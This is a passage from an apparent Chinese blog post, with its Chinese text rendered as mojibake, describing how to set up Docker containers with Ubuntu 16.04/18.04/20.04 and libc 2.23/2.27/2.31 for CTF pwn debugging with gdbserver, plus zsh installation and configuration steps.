<li>ä¸€é”®å¯åŠ¨æ‰€æœ‰å®¹å™¨å¹¶è¿›å…¥pwn-2.27ï¼š</li>
</ol>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker start pwn-2.23 pwn-2.27 pwn-2.31 &amp;&amp; docker <span class="built_in">exec</span> -it pwn-2.27 /bin/bash</span><br></pre></td></tr></table></figure>

<ol start="2">
<li>ä¸€é”®åœæ­¢æ‰€æœ‰å®¹å™¨å¹¶æŸ¥çœ‹çŠ¶æ€ï¼š</li>
</ol>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker stop pwn-2.23 pwn-2.27 pwn-2.31 &amp;&amp; docker ps -a</span><br></pre></td></tr></table></figure>

<ol start="3">
<li>å®¹å™¨å†…å¿«é€Ÿå¯åŠ¨é¢˜ç›®ï¼ˆpwn-2.27ç¤ºä¾‹ï¼‰ï¼š</li>
</ol>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> /root/myPwn/é¢˜ç›®æ–‡ä»¶å¤¹å &amp;&amp; <span class="built_in">chmod</span> +x ./é¢˜ç›®æ–‡ä»¶å &amp;&amp; gdbserver 0.0.0.0:9998 ./é¢˜ç›®æ–‡ä»¶å</span><br></pre></td></tr></table></figure>

<h2 id="åã€æ ¸å¿ƒé…ç½®å¯¹ç…§è¡¨"><a href="#åã€æ ¸å¿ƒé…ç½®å¯¹ç…§è¡¨" class="headerlink" title="åã€æ ¸å¿ƒé…ç½®å¯¹ç…§è¡¨"></a>åã€æ ¸å¿ƒé…ç½®å¯¹ç…§è¡¨</h2><table>
<thead>
<tr>
<th align="left">å®¹å™¨å</th>
<th align="left">Ubuntuç‰ˆæœ¬</th>
<th align="left">libcç‰ˆæœ¬</th>
<th align="left">æ˜ å°„ç«¯å£</th>
<th align="left">æœ¬åœ°æŒ‚è½½è·¯å¾„</th>
<th align="left">å®¹å™¨å†…æŒ‚è½½è·¯å¾„</th>
</tr>
</thead>
<tbody><tr>
<td align="left">pwn-2.23</td>
<td align="left">16.04</td>
<td align="left">2.23</td>
<td align="left">9997</td>
<td align="left">~&#x2F;Pwn&#x2F;myPwn</td>
<td align="left">&#x2F;root&#x2F;myPwn</td>
</tr>
<tr>
<td align="left">pwn-2.27</td>
<td align="left">18.04</td>
<td align="left">2.27</td>
<td align="left">9998</td>
<td align="left">~&#x2F;Pwn&#x2F;myPwn</td>
<td align="left">&#x2F;root&#x2F;myPwn</td>
</tr>
<tr>
<td align="left">pwn-2.31</td>
<td align="left">20.04</td>
<td align="left">2.31</td>
<td align="left">9999</td>
<td align="left">~&#x2F;Pwn&#x2F;myPwn</td>
<td align="left">&#x2F;root&#x2F;myPwn</td>
</tr>
</tbody></table>
<h2 id="åä¸€ã€æ—¥å¸¸è°ƒè¯•æµç¨‹æ€»ç»“"><a href="#åä¸€ã€æ—¥å¸¸è°ƒè¯•æµç¨‹æ€»ç»“" class="headerlink" title="åä¸€ã€æ—¥å¸¸è°ƒè¯•æµç¨‹æ€»ç»“"></a>åä¸€ã€æ—¥å¸¸è°ƒè¯•æµç¨‹æ€»ç»“</h2><ol>
<li>å¯åŠ¨å®¹å™¨ï¼š<code>docker start pwn-2.27</code>ï¼ˆæŒ‰éœ€æ›¿æ¢å®¹å™¨åï¼‰</li>
<li>è¿›å…¥å®¹å™¨ï¼š<code>docker exec -it pwn-2.27 /bin/bash</code></li>
<li>å¯åŠ¨é¢˜ç›®ï¼š<code>cd /root/myPwn/é¢˜ç›®ç›®å½• &amp;&amp; gdbserver 0.0.0.0:9998 ./é¢˜ç›®å</code></li>
<li>ä¸»æœºè°ƒè¯•ï¼šæ¿€æ´»Pythonç¯å¢ƒ â†’ è¿è¡Œè„šæœ¬ï¼ˆè¿æ¥å¯¹åº”ç«¯å£ï¼‰</li>
<li>ç»“æŸæ“ä½œï¼š<code>exit</code>ï¼ˆé€€å‡ºå®¹å™¨ï¼‰â†’ <code>docker stop pwn-2.27</code>ï¼ˆåœæ­¢å®¹å™¨ï¼‰</li>
</ol>
<h2 id="åäºŒã€Ubuntu-16-04-å®‰è£…zshï¼ˆè§£å†³è½¯ä»¶æºé—®é¢˜ï¼‰"><a href="#åäºŒã€Ubuntu-16-04-å®‰è£…zshï¼ˆè§£å†³è½¯ä»¶æºé—®é¢˜ï¼‰" class="headerlink" title="åäºŒã€Ubuntu 16.04 å®‰è£…zshï¼ˆè§£å†³è½¯ä»¶æºé—®é¢˜ï¼‰"></a>åäºŒã€Ubuntu 16.04 å®‰è£…zshï¼ˆè§£å†³è½¯ä»¶æºé—®é¢˜ï¼‰</h2><h3 id="Ubuntu-16-04-zshå®‰è£…æ­¥éª¤"><a href="#Ubuntu-16-04-zshå®‰è£…æ­¥éª¤" class="headerlink" title="Ubuntu 16.04 zshå®‰è£…æ­¥éª¤"></a>Ubuntu 16.04 zshå®‰è£…æ­¥éª¤</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 1. æ›´æ¢è½¯ä»¶æºï¼ˆè§£å†³Ubuntu 16.04è½¯ä»¶æºè¿‡æœŸé—®é¢˜ï¼‰</span></span><br><span class="line"><span class="built_in">cp</span> /etc/apt/sources.list /etc/apt/sources.list.backup</span><br><span class="line"></span><br><span class="line"><span class="comment"># ä½¿ç”¨archive.ubuntu.comï¼ˆæœ€ç¨³å®šçš„æºï¼‰</span></span><br><span class="line"><span class="built_in">cat</span> &gt; /etc/apt/sources.list &lt;&lt; <span class="string">&#x27;EOF&#x27;</span></span><br><span class="line">deb http://archive.ubuntu.com/ubuntu/ xenial main restricted universe multiverse</span><br><span class="line">deb http://archive.ubuntu.com/ubuntu/ xenial-updates main restricted universe multiverse</span><br><span class="line">deb http://archive.ubuntu.com/ubuntu/ xenial-backports main restricted universe multiverse</span><br><span class="line">deb http://security.ubuntu.com/ubuntu/ xenial-security main restricted universe multiverse</span><br><span class="line">EOF</span><br><span class="line"></span><br><span class="line"><span class="comment"># 2. æ›´æ–°è½¯ä»¶æº</span></span><br><span class="line">apt update</span><br><span class="line"></span><br><span class="line"><span class="comment"># 3. åªå®‰è£…æœ€åŸºæœ¬çš„zsh</span></span><br><span class="line">apt install -y zsh</span><br><span class="line"></span><br><span class="line"><span class="comment"># 4. åˆ›å»ºæç®€é…ç½®</span></span><br><span class="line"><span class="built_in">cat</span> &gt; ~/.zshrc &lt;&lt; <span class="string">&#x27;EOF&#x27;</span></span><br><span class="line"><span class="built_in">export</span> TERM=xterm-256color</span><br><span class="line">PS1=<span class="string">&quot;[%n@%m %~]$ &quot;</span></span><br><span class="line"><span class="built_in">alias</span> ll=<span class="string">&#x27;ls -la&#x27;</span></span><br><span class="line"><span class="built_in">alias</span> pwn-cd=<span class="string">&#x27;cd /root/myPwn&#x27;</span></span><br><span class="line">EOF</span><br><span class="line"></span><br><span class="line"><span class="comment"># 5. è®¾ç½®é»˜è®¤shell</span></span><br><span class="line">chsh -s $(<span class="built_in">which</span> zsh)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 6. é€€å‡ºå¹¶é‡æ–°è¿›å…¥æµ‹è¯•</span></span><br><span class="line"><span class="built_in">exit</span></span><br><span class="line">docker <span class="built_in">exec</span> -it pwn-2.23 zsh</span><br></pre></td></tr></table></figure>

<h3 id="Ubuntu-16-04-zshé¢œè‰²é…ç½®ï¼ˆå¯é€‰ï¼‰"><a href="#Ubuntu-16-04-zshé¢œè‰²é…ç½®ï¼ˆå¯é€‰ï¼‰" class="headerlink" title="Ubuntu 16.04 zshé¢œè‰²é…ç½®ï¼ˆå¯é€‰ï¼‰"></a>Ubuntu 16.04 zshé¢œè‰²é…ç½®ï¼ˆå¯é€‰ï¼‰</h3><p>å¦‚æœæç®€é…ç½®å·¥ä½œæ­£å¸¸ï¼Œå¯ä»¥æ·»åŠ é¢œè‰²ï¼š</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># å¤‡ä»½å½“å‰é…ç½®</span></span><br><span class="line"><span class="built_in">cp</span> ~/.zshrc ~/.zshrc.backup</span><br><span class="line"></span><br><span class="line"><span class="comment"># åˆ›å»ºå¸¦é¢œè‰²çš„é…ç½®</span></span><br><span class="line"><span class="built_in">cat</span> &gt; ~/.zshrc &lt;&lt; <span class="string">&#x27;EOF&#x27;</span></span><br><span class="line"><span class="comment"># å¯ç”¨é¢œè‰²æ”¯æŒ</span></span><br><span class="line"><span class="built_in">autoload</span> -U colors &amp;&amp; colors</span><br><span class="line"></span><br><span class="line"><span class="comment"># è®¾ç½®å½©è‰²æç¤ºç¬¦</span></span><br><span class="line">PS1=<span class="string">&quot;%&#123;<span class="variable">$fg</span>[green]%&#125;%n@%m%&#123;<span class="variable">$reset_color</span>%&#125;:%&#123;<span class="variable">$fg</span>[blue]%&#125;%~%&#123;<span class="variable">$reset_color</span>%&#125;$ &quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># è®¾ç½®ç»ˆç«¯ç±»å‹</span></span><br><span class="line"><span class="built_in">export</span> TERM=xterm-256color</span><br><span class="line"></span><br><span class="line"><span class="comment"># å¯ç”¨è‡ªåŠ¨è¡¥å…¨</span></span><br><span class="line"><span class="built_in">autoload</span> -U compinit</span><br><span class="line">compinit</span><br><span class="line"></span><br><span class="line"><span class="comment"># è®¾ç½®åˆ«åï¼ˆå¸¦é¢œè‰²ï¼‰</span></span><br><span class="line"><span class="built_in">alias</span> <span class="built_in">ls</span>=<span class="string">&#x27;ls --color=auto&#x27;</span></span><br><span class="line"><span class="built_in">alias</span> ll=<span class="string">&#x27;ls -la --color=auto&#x27;</span></span><br><span class="line"><span class="built_in">alias</span> grep=<span class="string">&#x27;grep --color=auto&#x27;</span></span><br><span class="line"><span class="built_in">alias</span> pwn-cd=<span class="string">&#x27;cd /root/myPwn&#x27;</span></span><br><span class="line"><span class="built_in">alias</span> gdb-start=<span class="string">&#x27;gdbserver 0.0.0.0:9997&#x27;</span></span><br><span class="line"><span class="built_in">alias</span> pwn-env=<span class="string">&#x27;echo &quot;Ubuntu 16.04 - libc 2.23 - Port 9997&quot;&#x27;</span></span><br><span class="line">EOF</span><br><span class="line"></span><br><span class="line"><span class="comment"># é‡æ–°åŠ è½½é…ç½®</span></span><br><span class="line"><span class="built_in">source</span> ~/.zshrc</span><br></pre></td></tr></table></figure>

<h2 id="åä¸‰ã€Ubuntu-18-04-20-04-å®‰è£…zshï¼ˆæ ‡å‡†æ–¹æ³•ï¼‰"><a href="#åä¸‰ã€Ubuntu-18-04-20-04-å®‰è£…zshï¼ˆæ ‡å‡†æ–¹æ³•ï¼‰" class="headerlink" title="åä¸‰ã€Ubuntu 18.04&#x2F;20.04 å®‰è£…zshï¼ˆæ ‡å‡†æ–¹æ³•ï¼‰"></a>åä¸‰ã€Ubuntu 18.04&#x2F;20.04 å®‰è£…zshï¼ˆæ ‡å‡†æ–¹æ³•ï¼‰</h2><h3 id="Ubuntu-18-04-20-04-zshå®‰è£…æ­¥éª¤"><a href="#Ubuntu-18-04-20-04-zshå®‰è£…æ­¥éª¤" class="headerlink" title="Ubuntu 18.04&#x2F;20.04 zshå®‰è£…æ­¥éª¤"></a>Ubuntu 18.04&#x2F;20.04 zshå®‰è£…æ­¥éª¤</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># è¿›å…¥å®¹å™¨</span></span><br><span class="line">docker <span class="built_in">exec</span> -it pwn-2.27 /bin/bash  <span class="comment"># æˆ– pwn-2.31</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># å®‰è£…zsh</span></span><br><span class="line">apt update &amp;&amp; apt install -y zsh</span><br><span class="line"></span><br><span class="line"><span class="comment"># åˆ›å»ºé…ç½®ï¼ˆå¯æ ¹æ®éœ€è¦é€‰æ‹©æç®€æˆ–å½©è‰²ç‰ˆæœ¬ï¼‰</span></span><br><span class="line"><span class="built_in">cat</span> &gt; ~/.zshrc &lt;&lt; <span class="string">&#x27;EOF&#x27;</span></span><br><span class="line"><span class="built_in">export</span> TERM=xterm-256color</span><br><span class="line">PS1=<span class="string">&quot;[%n@%m %~]$ &quot;</span></span><br><span class="line"><span class="built_in">alias</span> ll=<span class="string">&#x27;ls -la&#x27;</span></span><br><span class="line"><span class="built_in">alias</span> pwn-cd=<span class="string">&#x27;cd /root/myPwn&#x27;</span></span><br><span class="line"><span class="built_in">alias</span> gdb-start=<span class="string">&#x27;gdbserver 0.0.0.0:9998&#x27;</span>  <span class="comment"># 18.04ç”¨9998ï¼Œ20.04ç”¨9999</span></span><br><span class="line"><span class="built_in">alias</span> pwn-env=<span class="string">&#x27;echo &quot;Ubuntu 18.04 - libc 2.27 - Port 9998&quot;&#x27;</span>  <span class="comment"># ç›¸åº”ä¿®æ”¹ç‰ˆæœ¬ä¿¡æ¯</span></span><br><span class="line">EOF</span><br><span class="line"></span><br><span class="line"><span class="comment"># è®¾ç½®é»˜è®¤shell</span></span><br><span class="line">chsh -s $(<span class="built_in">which</span> zsh)</span><br></pre></td></tr></table></figure>

<h2 id="åå››ã€æ³¨æ„äº‹é¡¹"><a href="#åå››ã€æ³¨æ„äº‹é¡¹" class="headerlink" title="åå››ã€æ³¨æ„äº‹é¡¹"></a>åå››ã€æ³¨æ„äº‹é¡¹</h2><ol>
<li><strong>Ubuntu 16.04å¿…é¡»æ›´æ¢è½¯ä»¶æº</strong>åæ‰èƒ½æ­£å¸¸å®‰è£…zsh</li>
<li>å¦‚æœé‡åˆ°localeé”™è¯¯ï¼Œå¯æ‰§è¡Œï¼š<code>export LANG=C</code></li>
<li>æç®€é…ç½®ç¡®ä¿å…¼å®¹æ€§ï¼Œå½©è‰²é…ç½®æä¾›æ›´å¥½ä½“éªŒ</li>
<li>å»ºè®®å…ˆæµ‹è¯•æç®€é…ç½®ï¼Œç¡®è®¤æ­£å¸¸åå†å°è¯•å½©è‰²é…ç½®</li>
</ol>
]]></content>
      <categories>
        <category>ç½‘ç»œå®‰å…¨</category>
        <category>Pwn</category>
      </categories>
      <tags>
        <tag>Docker</tag>
        <tag>Pwn</tag>
      </tags>
  </entry>
</search>
